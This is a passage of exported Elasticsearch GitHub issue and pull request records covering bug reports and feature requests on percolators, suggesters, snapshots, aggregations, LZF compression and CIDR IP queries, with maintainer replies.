will take a closer look on monday
</comment><comment author="brwe" created="2014-09-01T08:32:15Z" id="54034010">Managed to pick in 1.2 also and think now that changes are isolated enough. Will push to master, 1.x, 1.3 and 1.2
</comment><comment author="brwe" created="2014-09-01T08:45:42Z" id="54035180">Pushed 9750375412 (master), 3237714 and 753c4ad (1.2), 3ad63a4 (1.3) and 24bb3b1(1.x) 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Removing useless methods and method parameters from ObjectMapper.java and TypeParsers.java</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7474</link><project id="" key="" /><description>While working on #7271 I found some methods that were not being used (I searched for the names too, to see if I could find any reflective calls) and some method parameters too.

To make it easier to merge #7271 I am submitting this as a side Pull request.

I've ran all tests and they OK!

Thanks
</description><key id="41257046">7474</key><summary>Removing useless methods and method parameters from ObjectMapper.java and TypeParsers.java</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">cfontes</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-27T07:50:17Z</created><updated>2015-06-07T12:10:28Z</updated><resolved>2014-09-02T07:48:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-02T07:49:00Z" id="54119245">@cfontes Merged, thanks!
</comment><comment author="dadoonet" created="2014-09-04T09:18:11Z" id="54437926">@jpountz Just a note. It breaks plugins as method

``` java
public static void parseMultiField(AbstractFieldMapper.Builder builder, String name, Map&lt;String, Object&gt; node, Mapper.TypeParser.ParserContext parserContext, String propName, Object propNode)
```

has been changed to:

``` java
public static void parseMultiField(AbstractFieldMapper.Builder builder, String name, Mapper.TypeParser.ParserContext parserContext, String propName, Object propNode)
```

Without keeping the old method and deprecate it in 1.4.0.

Not a big deal but some mapper plugin authors could hit this. (Mapper attachments is one of them :) )
</comment><comment author="jpountz" created="2014-09-04T09:39:54Z" id="54441475">@dadoonet Thanks for the note. At some point, I think we will need to define which (if any) internal APIs are safe to use by plugins. (Related to https://github.com/elasticsearch/elasticsearch/issues/7415 ?)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Query returns wrong/different results when in a percolator</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7473</link><project id="" key="" /><description>First up, I'm using Elasticsearch v1.1.1

I am getting an unexpected result from a percolator. I have broken it down to it's simplest parts and it still not working as I it should.

Firstly I create a new index with mapping:

```
PUT /test1
{
   "mappings": {
      "product": {
         "properties": {
            "subject": {
               "type": "nested",
               "properties": {
                  "code": {
                     "type": "string"
                  }
               }
            }
         }
      }
   }
}
```

Then I create two objects for testing:

```
PUT /test1/product/12345
{
    "subject": {
        "code": "FA"
    }
}
```

```
PUT /test1/product/12346
{
    "subject": {
        "code": "BA"
    }
}
```

Then I create a query that I would expect to match on the second record only:

```
GET /test1/product/_search
{
   "query": {
      "filtered": {
         "query": {
            "match_all": []
         },
         "filter": {
            "bool": {
               "must_not": [
                  {
                     "query": {
                        "nested": {
                           "path": "subject",
                           "query": {
                              "prefix": {
                                 "subject.code": "fa"
                              }
                           }
                        }
                     }
                  }
               ]
            }
         }
      }
   }
}
```

So far everything is working as expected. The query returns the second record, the first one being excluded by the filter.

I then use the same query to create a percolator:

```
PUT /test1/.percolator/TEST
{
   "query": {
      "filtered": {
         "query": {
            "match_all": []
         },
         "filter": {
            "bool": {
               "must_not": [
                  {
                     "query": {
                        "nested": {
                           "path": "subject",
                           "query": {
                              "prefix": {
                                 "subject.code": "fa"
                              }
                           }
                        }
                     }
                  }
               ]
            }
         }
      }
   }
}
```

And test against both records:

```
GET /test1/product/12345/_percolate

GET /test1/product/12346/_percolate
```

They both return the same result:

```
{
   "took": 1,
   "_shards": {
      "total": 5,
      "successful": 5,
      "failed": 0
   },
   "total": 1,
   "matches": [
      {
         "_index": "test1",
         "_id": "TEST"
      }
   ]
}
```

I have tested this without a nested object and it operates as I would expect. At first I thought perhaps the match_all was doing something strange to the percolator but when it wasn't a nested object it worked fine.
</description><key id="41238590">7473</key><summary>Query returns wrong/different results when in a percolator</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bejs</reporter><labels /><created>2014-08-27T00:43:48Z</created><updated>2014-09-02T15:00:09Z</updated><resolved>2014-09-02T15:00:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-02T15:00:09Z" id="54164582">Hi @bejs 

This issue was fixed in v1.2.2, see #6540. 

thanks for good report though
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Phrase suggester with suggest_mode: "missing" across multiple indexes yields suggestions when results exist in one index</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7472</link><project id="" key="" /><description>I have found a few odd cases where the phrase suggester with suggest_mode: "missing" generates a suggestion even though the query returns results. I am querying across two indexes but the query term only exists in one of the indexes. I get the search results I expect, but I do not expect to get a suggestion.

I am trying to come up with a curl recreation but I haven't been able to reproduce it yet in a smaller corpus. 

I believe what is happening is that the phrase suggestions are getting merged together in the same way the query results are merged together across multiple indexes. If I have query results from test_1 and no results from test_2, then I expect to see results from test_1. But if I have a suggestion from test_1 and no suggestion from test_2 (due to suggest_mode: "missing"), I do not expect to see a suggestion.
</description><key id="41236484">7472</key><summary>Phrase suggester with suggest_mode: "missing" across multiple indexes yields suggestions when results exist in one index</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">loren</reporter><labels><label>:Suggesters</label><label>adoptme</label><label>enhancement</label><label>low hanging fruit</label></labels><created>2014-08-27T00:05:28Z</created><updated>2017-07-01T09:36:37Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bunkat" created="2014-12-08T00:11:11Z" id="65962728">I'm hitting this as well.  I have `stuff/project` and `stuff/file`.  When I search `stuff/_search`, if a hit is found in one but not the other, I get a suggestion back that usually makes no sense.
</comment><comment author="loren" created="2014-12-08T15:45:45Z" id="66134327">Are you able to isolate it with a small test case that you can Gist? I tried but wasn't able to do it.

&gt; On Dec 7, 2014, at 4:11 PM, bill notifications@github.com wrote:
&gt; 
&gt; I'm hitting this as well. I have stuff/project and stuff/file. When I search stuff/_search, if a hit is found in one but not the other, I get a suggestion back that usually makes no sense.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub https://github.com/elasticsearch/elasticsearch/issues/7472#issuecomment-65962728.
</comment><comment author="czheo" created="2015-06-18T06:10:47Z" id="113048206">I reproduced this case with term suggester. Please have a look at https://github.com/elastic/elasticsearch/issues/11739
</comment><comment author="clintongormley" created="2015-06-18T18:10:24Z" id="113242914">The reason for this is that you probably have too few documents across too many shards. Suggestions are calculated per shard, then merged. So the term specified exists on one shard and is missing on the other, which is why it is included as a suggestion.

A similar problem exists with relevance when searching across a tiny collection of documents. See https://www.elastic.co/guide/en/elasticsearch/guide/current/relevance-is-broken.html

We could probably pass back a "found: true|false" flag from each shard, then remove suggestions if any shard found the term.
</comment><comment author="czheo" created="2015-06-19T02:24:17Z" id="113344480">Hi @clintongormley Thank you for your reply. I have thought it might be related to different shards. But it seems to be not a hard implementation to be across shards and no clue is mentioned in the official document, I thought it might be a bug rather than a feature. Since it's a low hanging fruit, I really hope to see it fixed soon.
</comment><comment author="vidyaramanathan" created="2017-03-22T23:58:20Z" id="288576192">Hi - I have a similar issue. Is there any solution for this problem other than going with one primary shard ? (since we may have million documents and need to scale out instead of scale in to get better results)

I've posted my concern here as well -
https://discuss.elastic.co/t/phrase-suggester-returned-suggestions-even-if-searched-keyword-is-in-the-index/79656</comment><comment author="nik9000" created="2017-03-23T13:40:03Z" id="288722067">I think of `missing` as a performance think that is useful for making the request cheaper to run. I don't think it does a particularly good job of making good suggestions because the whole point of the phrase suggester is to suggest better phrases even when the one that the user types is pretty good.</comment><comment author="sproot" created="2017-06-30T20:53:41Z" id="312370522">Hi guys! Is anyone going to fix this issue? it doesn't work even with ` "number_of_shards": "1"` in the settings. </comment><comment author="sproot" created="2017-06-30T21:08:49Z" id="312373447">Also can anybody please give an example where `suggest_mode: "missing"` works in some conditions with just one shard, particular elastic version and in the full moon shining or something?</comment><comment author="sproot" created="2017-07-01T09:36:37Z" id="312421932">```javascript
PUT t
{
  "settings": {
    "number_of_shards": 1
  }
}
```
```javascript
POST t/t/
{  "text": "frameworks"}
```
```javascript
POST /t/_search
{
  "query": {
    "match_all": {}
  },
  "suggest": {
    "mysuggest": {
      "text": "frameworks",
      "term": {
        "field": "text",
        "suggest_mode": "missing",
        "sort": "score",
        "size": 20
      }
    }
  }
}
```
result:
```javascript
{
  "took": 1,
  "timed_out": false,
  "_shards": {
    "total": 1,
    "successful": 1,
    "failed": 0
  },
  "hits": {
    "total": 1,
    "max_score": 1,
    "hits": [
      {
        "_index": "t",
        "_type": "t",
        "_id": "AVz9ayuf8yrcHIrgYY2s",
        "_score": 1,
        "_source": {
          "text": "frameworks"
        }
      }
    ]
  },
  "suggest": {
    "mysuggest": [
      {
        "text": "frameworks",
        "offset": 0,
        "length": 10,
        "options": [

        ]
      }
    ]
  }
}
```

What i'm doing wrong? :)</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Snapshot create returns "state":"SUCCESS" when there are failed shards</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7471</link><project id="" key="" /><description>Calling `http://elasticsearch:9200/_snapshot/local/test-small` on a single index returns the following. Why would a response ever report success when there are failed shards?

``` json
{  
   "snapshot":"test-small",
   "repository":"local",
   "state":"SUCCESS",
   "shards_stats":{  
      "initializing":0,
      "started":0,
      "finalizing":0,
      "done":3,
      "failed":2,
      "total":5
   },
   "stats":{  
      "number_of_files":0,
      "processed_files":0,
      "total_size_in_bytes":0,
      "processed_size_in_bytes":0,
      "start_time_in_millis":0,
      "time_in_millis":0
   },
   "indices":{  
      "&lt;index name&gt;":{  
         "shards_stats":{  
            "initializing":0,
            "started":0,
            "finalizing":0,
            "done":3,
            "failed":2,
            "total":5
         },
         "stats":{  
            "number_of_files":0,
            "processed_files":0,
            "total_size_in_bytes":0,
            "processed_size_in_bytes":0,
            "start_time_in_millis":0,
            "time_in_millis":0
         },
         "shards":{  
            "4":{  
               "stage":"DONE",
               "stats":{  
                  "number_of_files":0,
                  "processed_files":0,
                  "total_size_in_bytes":0,
                  "processed_size_in_bytes":0,
                  "start_time_in_millis":0,
                  "time_in_millis":0
               }
            },
            "0":{  
               "stage":"DONE",
               "stats":{  
                  "number_of_files":0,
                  "processed_files":0,
                  "total_size_in_bytes":0,
                  "processed_size_in_bytes":0,
                  "start_time_in_millis":0,
                  "time_in_millis":0
               }
            },
            "1":{  
               "stage":"FAILURE",
               "stats":{  
                  "number_of_files":0,
                  "processed_files":0,
                  "total_size_in_bytes":0,
                  "processed_size_in_bytes":0,
                  "start_time_in_millis":0,
                  "time_in_millis":0
               }
            },
            "2":{  
               "stage":"DONE",
               "stats":{  
                  "number_of_files":0,
                  "processed_files":0,
                  "total_size_in_bytes":0,
                  "processed_size_in_bytes":0,
                  "start_time_in_millis":0,
                  "time_in_millis":0
               }
            },
            "3":{  
               "stage":"FAILURE",
               "stats":{  
                  "number_of_files":0,
                  "processed_files":0,
                  "total_size_in_bytes":0,
                  "processed_size_in_bytes":0,
                  "start_time_in_millis":0,
                  "time_in_millis":0
               }
            }
         }
      }
   }
}
```
</description><key id="41233490">7471</key><summary>Snapshot create returns "state":"SUCCESS" when there are failed shards</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bobpoekert</reporter><labels /><created>2014-08-26T23:18:07Z</created><updated>2014-08-27T00:10:30Z</updated><resolved>2014-08-27T00:10:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-27T00:10:20Z" id="53511007">Thank you for taking your time to report this issue. If you have created this snapshot using elasticsearch prior to v1.2.0 it's a bug that was fixed by #5792. If you are experiencing this issue with a recent version of elasticsearch, please reopen the issue and attach error messages from log files corresponding to creation of this snapshot.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>min_doc_count when set to 0 returns incorrect aggregations</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7470</link><project id="" key="" /><description>I am using Elasticsearch 1.1.3.

Let's say there is a field called "key" which can only take a value between "v0", "v1", "v2", "v3" and "v4".

If I execute the following query, as expected I get term bucket only for "v0" with a non-zero document count.
{
    "query": {
        "term": { "key": "v0" }
    },
    "aggs" : {
        "keys" : {
            "terms" : { "field" : "key" }
        }
    }
} 

But if I add "min_doc_count" : 0, I get additional term buckets for "v1", "v2", "v3" and "v4" also. They have zero document count though.

My understanding is that aggregations in this case get computed over the documents that are returned by the query. In this case, all documents returned by the query have the "key" field set to "v0" only. But I get buckets for other values too. Isn't this a bug?

My actual requirements are a bit different than this stripped down example but the problem remains the same.
</description><key id="41231243">7470</key><summary>min_doc_count when set to 0 returns incorrect aggregations</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bittusarkar</reporter><labels /><created>2014-08-26T22:45:43Z</created><updated>2014-09-02T14:54:53Z</updated><resolved>2014-09-02T14:54:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-02T14:54:53Z" id="54163726">This is not a bug. It is the way it is intended to work.  The filter just limits which documents get passed to the aggregations.  The aggregation then looks at all values in that field in all the documents in the index.  Normally it will only return counts &gt; 0, but because you specify `min_doc_count` set to 0, you get all values.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Getting different results while using bool query vs bool query with function score query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7469</link><project id="" key="" /><description>I am trying to add a custom boost to the different should clauses in the bool query, but I am getting different number of results when I use the bool query with 2 should clauses containing 2 simple query string query vs a bool query with 2 should clauses with 2 function score query encapsulating the same simple query string queries. 
The following query returns me 2 results for my data set:
{
  "query" : {
    "filtered" : {
          "query" : {
            "bool" : {
              "should" : [ {
                    "simple_query_string" : {
                      "query" : "128",
                      "fields" : [ "content.name_enu.simple" ]
                    }
                  }, {
                    "simple_query_string" : {
                      "query" : "128",
                      "fields" : [ "content.name_enu.simple_with_numeric" ]
                    }
                  } ]
            }
      },
      "filter" : {
        "bool" : {
          "must" : [ {
            "term" : {
              "securityInfo.securityType" : "open"
            }
          }, {
            "bool" : {
              "must" : [ {
                "term" : {
                  "sourceId.sourceSystem" : "jmeter_007971_numeric"
                }
              }, {
                "term" : {
                  "sourceId.type" : "file"
                }
              } ]
            }
          } ],
          "_cache" : true
        }
      }
    }
  },
  "fields" : [ "elementId", "sourceId.id", "sourceId.type", "sourceId.sourceSystem", "sourceVersion", "content.name_enu" ]
}

Where as if I use the following query I get 5 results, same simple query strings but with function scores:
{
  "query" : {
    "filtered" : {
          "query" : {
            "bool" : {
              "should" : [ {
                "function_score" : {
                  "query" : {
                    "simple_query_string" : {
                      "query" : "128",
                      "fields" : [ "content.name_enu.simple" ]
                    }
                  },
                  "boost_factor" : 1.5
                }
              }, {
                "function_score" : {
                  "query" : {
                    "simple_query_string" : {
                      "query" : "128",
                      "fields" : [ "content.name_enu.simple_with_numeric" ]
                    }
                  },
                  "boost_factor" : 2.5
                }
              } ]
            }
      },
      "filter" : {
        "bool" : {
          "must" : [ {
            "term" : {
              "securityInfo.securityType" : "open"
            }
          }, {
            "bool" : {
              "must" : [ {
                "term" : {
                  "sourceId.sourceSystem" : "jmeter_007971_numeric"
                }
              }, {
                "term" : {
                  "sourceId.type" : "file"
                }
              } ]
            }
          } ],
          "_cache" : true
        }
      }
    }
  },
  "fields" : [ "elementId", "sourceId.id", "sourceId.type", "sourceId.sourceSystem", "sourceVersion", "content.name_enu" ]
}

From my understanding of how the should clause works I was expecting both the queries to return 5 results but I am not able to understand why the 1st query returns me 2 results for my data set. The "content.name_enu.simple" uses a simple analyzer, whereas simple_with_numeric uses whitespace tokenizer and lowercase filter
</description><key id="41229410">7469</key><summary>Getting different results while using bool query vs bool query with function score query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">akshaysh</reporter><labels><label>feedback_needed</label></labels><created>2014-08-26T22:23:02Z</created><updated>2014-10-22T15:07:56Z</updated><resolved>2014-10-22T15:07:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-02T11:01:41Z" id="54136455">Hi @akshaysh 

I don't know why you're only getting two results from the first query.  I agree that it looks like both of them should return the same results.  Please could you take one of the missing results and run it through the `explain` API.  See http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-explain.html#search-explain

This will tell you why that document was excluded. 
</comment><comment author="clintongormley" created="2014-09-07T09:43:04Z" id="54742151">HI @akshaysh 

Any more info?
</comment><comment author="clintongormley" created="2014-10-22T15:07:56Z" id="60099906">No more info. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add all unsafe variants of LZF compress library functions to forbidden APIs.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7468</link><project id="" key="" /><description>The "optimized" encoders/decoders have been unreliable and error prone.
Also, fix LZFCompressor.compress to use LZFEncoder.safeEncode, which
creates a new safe encoder, instead of using a shared encoder (which
is not threadsafe).

Closes #8078
</description><key id="41229083">7468</key><summary>Add all unsafe variants of LZF compress library functions to forbidden APIs.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>:Internal</label><label>bug</label><label>v1.3.5</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-26T22:18:48Z</created><updated>2015-06-07T19:00:24Z</updated><resolved>2014-08-27T03:18:04Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-08-26T23:51:02Z" id="53509632">looks good, thanks Ryan
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add an upperbound for explicit/forced refresh</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7467</link><project id="" key="" /><description>Have a use case in the field where every document update needs to be refreshed immediately (more often than once per 1s).  We certainly do not recommend issuing extremely frequent forced _refresh calls.  One workaround is to implement client code to store a "state" for when the last forced refresh occurred and to delay subsequent forced refreshes accordingly.    Would be nice to add an upperbound setting for explicit/forced refresh so this can be handled from the server side.
</description><key id="41217671">7467</key><summary>Add an upperbound for explicit/forced refresh</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels><label>:CRUD</label><label>adoptme</label><label>enhancement</label></labels><created>2014-08-26T20:29:04Z</created><updated>2016-01-22T18:27:45Z</updated><resolved>2015-11-21T18:04:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-08-26T20:34:26Z" id="53486280">I'm not sure I understand, but is this #1063?
</comment><comment author="ppf2" created="2014-08-26T21:04:00Z" id="53491888">This is related to #1063.  This one is more focused on safeguard measures for when the end user tries to issue extremely frequent explicit refresh calls.
</comment><comment author="mikemccand" created="2014-08-26T22:41:33Z" id="53503973">Yeah I think this issue is different, and might be quite a bit easier to implement than #1063 and can I think achieve the same goals as #1063 for most applications?  Ie, the client would always refresh after the indexed changes before running the query that must reflect the changes, and those forced refreshes would be rate limited so that if N such requests arrive at once they all wait until the next scheduled refresh.
</comment><comment author="clintongormley" created="2014-09-02T11:05:07Z" id="54136719">@ppf2 @mikemccand I don't really understand what is being suggested here.  Is this on indexing? on search?  More info please.
</comment><comment author="mikemccand" created="2014-09-02T12:36:09Z" id="54144679">@clintongormley It's during indexing.  It would be a new parameter, e.g. index.min_refresh_interval = 0.2s, which would mean "at most refresh once every 0.2s when force refresh API is invoked".
</comment><comment author="clintongormley" created="2014-11-07T10:26:40Z" id="62124240">Should combine this with sequence IDs, so an indexing request with ?refresh does a "maybe refresh" unless the request's sequence ID has already been refreshed. That reduces the number of refreshes, and gives wait-for-refresh semantics, plus with `min_refresh_interval` we can throttle refreshing.
</comment><comment author="clintongormley" created="2015-11-21T18:04:26Z" id="158667765">Closing in favour of #1063
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add LZF safe encoder in LZFCompressor</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7466</link><project id="" key="" /><description>Selecting the safe encoder fixes a 64bit JVM crash on big-endian architectures with
LZF UnsafeChunkEncoderBE.

Example of such a big-endian architecture is Solaris SPARC 64bit (another one is POWER).

Without safe encoder, LZF uses the unsafe encoder, and crashes when
for example this command is executed

```
    PUT /_template/logstash
    {
            "template" : "logstash-*",
            "settings" : {
                    "index.refresh_interval" : "5s"
            },
            "mappings" : {
                    "_default_" : {
                            "_all" : { "enabled" : true },
                            "dynamic_templates" : [ {
                                    "string_fields" : {
                                            "match" : "*",
                                            "match_mapping_type" : "string",
                                            "mapping" : {
                                                    "type" : "string",
                                                    "index" : "analyzed",
                                                    "omit_norms" : true,
                                                    "fields" : {
                                                            "raw" : {
                                                                    "type": "string",
                                                                    "index" : "not_analyzed",
                                                                    "ignore_above" : 256
                                                            }
                                                    }
                                            }
                                    }
                            } ],
                            "properties" : {
                                    "@version": { "type": "string", "index": "not_analyzed" },
                                    "geoip"  : {
                                            "type" : "object",
                                            "dynamic": true,
                                            "path": "full",
                                            "properties" : {
                                                    "location" : { "type" : "geo_point" }
                                            }
                                    }
                            }
                    }
            }
    }
```

A crash file is available at https://gist.github.com/jprante/79f4b4c0b9fd83eb1c9b
</description><key id="41212204">7466</key><summary>Add LZF safe encoder in LZFCompressor</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/rjernst/following{/other_user}', u'events_url': u'https://api.github.com/users/rjernst/events{/privacy}', u'organizations_url': u'https://api.github.com/users/rjernst/orgs', u'url': u'https://api.github.com/users/rjernst', u'gists_url': u'https://api.github.com/users/rjernst/gists{/gist_id}', u'html_url': u'https://github.com/rjernst', u'subscriptions_url': u'https://api.github.com/users/rjernst/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/289412?v=4', u'repos_url': u'https://api.github.com/users/rjernst/repos', u'received_events_url': u'https://api.github.com/users/rjernst/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/rjernst/starred{/owner}{/repo}', u'site_admin': False, u'login': u'rjernst', u'type': u'User', u'id': 289412, u'followers_url': u'https://api.github.com/users/rjernst/followers'}</assignee><reporter username="">jprante</reporter><labels><label>bug</label></labels><created>2014-08-26T19:38:45Z</created><updated>2014-09-08T18:37:26Z</updated><resolved>2014-08-26T20:39:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-08-26T20:03:06Z" id="53480506">Thank you @jprante for digging into this! I thought we had disabled the unsafe methods here completely in #7210, but the simple 'batch' method is still using it.
</comment><comment author="rjernst" created="2014-08-26T20:35:01Z" id="53486393">This looks good. I will commit shortly. Thanks @jprante!
</comment><comment author="rjernst" created="2014-08-26T21:10:11Z" id="53492869">@jprante, I committed this, but removed the changes from LZFCompressedStreamOutput because lots of tests fail without a new safeInstance() per stream output (I presume because it is not threadsafe).
</comment><comment author="rjernst" created="2014-08-26T22:48:15Z" id="53504592">FYI, I actually need to back this out completely, because of the threadsafe issues.  Instead I am changing the call to LZFEncoder.encode() to LZFEncoder.safeEncode.  See #7468
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Extended ActionFilter to also enable filtering the response side</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7465</link><project id="" key="" /><description>Enables filtering the actions on both sides - request and response. Also added a base class for filter implementations (cleans up filters that only need to filter one side)
</description><key id="41203492">7465</key><summary>Extended ActionFilter to also enable filtering the response side</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-26T18:12:09Z</created><updated>2015-06-07T12:10:37Z</updated><resolved>2014-09-06T11:54:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-08-27T14:09:34Z" id="53577351">Left a few comments
</comment><comment author="uboness" created="2014-09-03T14:34:16Z" id="54306238">@s1monw as we discussed, added a simple base class that relieves the implementation from dealing with filter chain. The base class is an abstract component as the way action filters are registered is via the modules (and the module binds them). 

Also renamed the methods to have more intuitive names.
</comment><comment author="s1monw" created="2014-09-05T19:28:43Z" id="54670339">LGTM except of the `_` in the method name please fix that one 
</comment><comment author="uboness" created="2014-09-06T11:54:56Z" id="54710232">merged in 333a39cf3034c59fa88f4432f53b3989bbd26eee
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Search for IP addresses with CIDR notation, in query_string</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7464</link><project id="" key="" /><description>Today we can search for ranges IP addresses in fields with a query string query like this:
`ip_address:[10.0.0.0 TO 10.255.255.255]`

It would be great if we could do:
`ip_address:10.0.0.0/8`  or  `ip_address:10/8`.

This is mostly useful in kibana, where all queries are sent at query_string queries. I understand that `ip_range` aggregation currently supports this. Would be nice in a QSQ :-)
</description><key id="41201554">7464</key><summary>Search for IP addresses with CIDR notation, in query_string</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">avleen</reporter><labels><label>:Query DSL</label><label>adoptme</label><label>feature</label></labels><created>2014-08-26T17:52:55Z</created><updated>2016-10-20T17:31:17Z</updated><resolved>2015-11-20T15:51:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="td-edge" created="2015-01-08T18:37:36Z" id="69226295">+1 This would be a big help if we could search without the ranges.
</comment><comment author="webmstr" created="2015-01-30T23:00:48Z" id="72285856">+1
</comment><comment author="zaakiy" created="2015-02-24T00:11:29Z" id="75669070">+1
</comment><comment author="Pytlicek" created="2015-03-24T13:39:17Z" id="85500075">+1
</comment><comment author="JiounDai" created="2015-03-25T08:59:08Z" id="85937091">but 
"must_not": [
      {
          "query_string": {
                "query": "clientip:[10.44.0.0 TO 10.44.255.255]"
              }
      }
]
can not work well
</comment><comment author="ajmurmann" created="2015-03-30T23:07:44Z" id="87872271">+1
